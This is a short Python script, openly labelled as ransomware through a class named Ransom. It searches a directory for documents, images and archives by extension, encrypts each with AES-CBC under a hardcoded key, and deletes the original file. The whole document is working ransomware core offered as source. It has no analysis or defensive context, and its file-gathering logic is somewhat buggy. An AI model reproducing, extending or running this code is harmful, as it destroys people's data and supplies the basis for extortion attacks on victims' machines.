#!/usr/bin/python

from os import walk
import os, random, struct
from Crypto.Cipher import AES
from Crypto import Random
key = '0123456789abcdef'
name = 'test.txt'
path = './test_ground/'
extension=['jpg','txt','doc','png','ppt','pdf','docx','psd','ai','tif','dmg','7z']

class Ransom():
    def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
        """ Encrypts a file using AES (CBC mode) with the
            given key.

            key:
                The encryption key - a string that must be
                either 16, 24 or 32 bytes long. Longer keys
                are more secure.

            in_filename:
                Name of the input file

            out_filename:
                If None, '<in_filename>.enc' will be used.

            chunksize:
                Sets the size of the chunk which the function
                uses to read and encrypt the file. Larger chunk
                sizes can be faster for some files and machines.
                chunksize must be divisible by 16.
        """
        if not out_filename:
            out_filename = in_filename + '.enc'

        iv = Random.get_random_bytes(16)
        encryptor = AES.new(key, AES.MODE_CBC, iv)
        filesize = os.path.getsize(in_filename)

        with open(in_filename, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(struct.pack('<Q', filesize))
                outfile.write(iv)

                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)

                    outfile.write(encryptor.encrypt(chunk))
        infile.close()
        os.remove(in_filename)

    def lookfor_files(mypath):
        f = []
        for (dirpath, dirnames, filenames) in walk(mypath):
            for files in filenames:
                if files.lower().split(".")[-1] in extension:
                    f.extend(filenames)
        return f


if __name__ == "__main__":
    filenames = []
    filenames = Ransom.lookfor_files(path)
    for f in filenames:
        Ransom.encrypt_file(key,path+f)